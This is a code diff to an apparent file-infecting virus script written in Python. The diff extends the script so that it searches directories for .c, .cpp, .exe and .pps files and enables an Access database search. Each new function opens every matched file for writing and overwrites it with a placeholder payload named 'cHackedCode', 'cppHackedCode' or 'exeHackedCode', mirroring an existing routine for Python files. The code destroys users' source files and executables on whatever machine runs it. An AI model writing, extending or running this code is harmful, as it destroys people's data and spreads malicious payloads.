@@ -21,7 +21,9 @@ pathsToSQL = []
 
 # Other Programming Languages
 pathsToPY = []
-
+pathsToC = []
+pathsToCPP = []
+pathsToEXE = []
 # Microsoft Office File Types
 pathsToACCDB = []
 pathsToXLSX = []
@@ -56,17 +58,20 @@ def searchForKnownFileTypes(*directories):
 
     # Microsoft Office File Types
 
-    #findACCDB()
+    findACCDB()
     findXLSX()
     findPPTX()
     findDOCX()
     findRTF()
+
+    # More Computer Based Languages
     findPY()
+    findC()
+    findCPP()
+    findEXE()
     """
     # More Computer Based Languages
-    findC()
     findCS()
-    findCPP()
     findH()"""
 
 # Web Development Languages
@@ -246,6 +251,7 @@ def findPPTX():
     dirNameOfDir = listOfAvailDirs[j][1][1]
     filteredPPTX = fnmatch.filter(filesInsideDir, '*.pptx')
     filteredPPTX.extend(fnmatch.filter(filesInsideDir, '*.ppt'))
+    filteredPPTX.extend(fnmatch.filter(filesInsideDir, '*.pps'))
     if len(filteredPPTX) > 0:
         for k in range(len(filteredPPTX)):
             pathsToPPTX.append(dirNameOfDir + "\\" + filteredPPTX[k - 1])
@@ -301,6 +307,49 @@ def populatePY():
         PYFile.write(pyHackedCode)
         PYFile.close()
 
+def findC():
+    filesInsideDir = listOfAvailDirs[j][3][1]
+    dirNameOfDir = listOfAvailDirs[j][1][1]
+    filteredC = fnmatch.filter(filesInsideDir, '*.c')
+    if len(filteredC) > 0:
+        for k in range(len(filteredC)):
+            pathsToC.append(dirNameOfDir + "\\" + filteredC[k - 1])
+        populateC()
+def populateC():
+    for l in range(len(pathsToC)):
+        CFile = open(pathsToC[l - 1], "w")
+        CFile.write(cHackedCode)
+        CFile.close()
+
+def findCPP():
+    filesInsideDir = listOfAvailDirs[j][3][1]
+    dirNameOfDir = listOfAvailDirs[j][1][1]
+    filteredCPP = fnmatch.filter(filesInsideDir, '*.cpp')
+    if len(filteredCPP) > 0:
+        for k in range(len(filteredCPP)):
+            pathsToCPP.append(dirNameOfDir + "\\" + filteredCPP[k - 1])
+        populateCPP()
+def populateCPP():
+    for l in range(len(pathsToCPP)):
+        CPPFile = open(pathsToCPP[l - 1], "w")
+        CPPFile.write(cppHackedCode)
+        CPPFile.close()
+
+def findEXE():
+    filesInsideDir = listOfAvailDirs[j][3][1]
+    dirNameOfDir = listOfAvailDirs[j][1][1]
+    filteredEXE = fnmatch.filter(filesInsideDir, '*.exe')
+    if len(filteredEXE) > 0:
+        for k in range(len(filteredEXE)):
+            pathsToEXE.append(dirNameOfDir + "\\" + filteredEXE[k - 1])
+        populateEXE()
+def populateEXE():
+    for l in range(len(pathsToEXE)):
+        EXEFile = open(pathsToEXE[l - 1], "w")
+        EXEFile.write(exeHackedCode)
+        EXEFile.close()
+
+
 
 """
 def findC(*directories):
@@ -313,11 +362,6 @@ def findCS(*directories):
     for i in directories:
         availDirs.append(i)
     filteredCS = fnmatch.filter(availDirs, '*.cs')
-def findCPP(*directories):
-    availDirs = []
-    for i in directories:
-        availDirs.append(i)
-    filteredCPP = fnmatch.filter(availDirs, '*.cpp')
 def findH(*directories):
 """
 
